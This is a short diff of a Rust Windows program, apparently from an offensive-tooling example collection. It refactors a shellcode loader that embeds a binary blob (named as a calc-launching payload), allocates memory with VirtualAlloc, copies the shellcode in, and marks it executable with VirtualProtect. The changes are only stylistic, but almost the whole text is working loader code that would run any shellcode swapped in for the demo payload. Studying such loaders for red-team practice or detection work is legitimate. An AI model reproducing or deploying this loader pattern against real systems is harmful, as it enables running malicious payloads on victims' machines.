@@ -8,8 +8,8 @@ use windows_sys::Win32::System::Memory::{
 };
 use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};
 
-static SHELLCODE: [u8; 98] = *include_bytes!("../../w64-exec-calc-shellcode-func.bin");
-static SIZE: usize = SHELLCODE.len();
+const SHELLCODE: &[u8] = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
+const SIZE: usize = SHELLCODE.len();
 
 #[cfg(target_os = "windows")]
 fn main() {
@@ -17,12 +17,12 @@ fn main() {
 
     unsafe {
         let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if dest == null_mut() {
+        if dest.is_null() {
             eprintln!("VirtualAlloc failed!");
             return;
         }
 
-        copy(SHELLCODE.as_ptr(), dest as *mut u8, SIZE);
+        copy(SHELLCODE.as_ptr(), dest.cast(), SIZE);
 
         let res = VirtualProtect(dest, SIZE, PAGE_EXECUTE, &mut old);
         if res == FALSE {
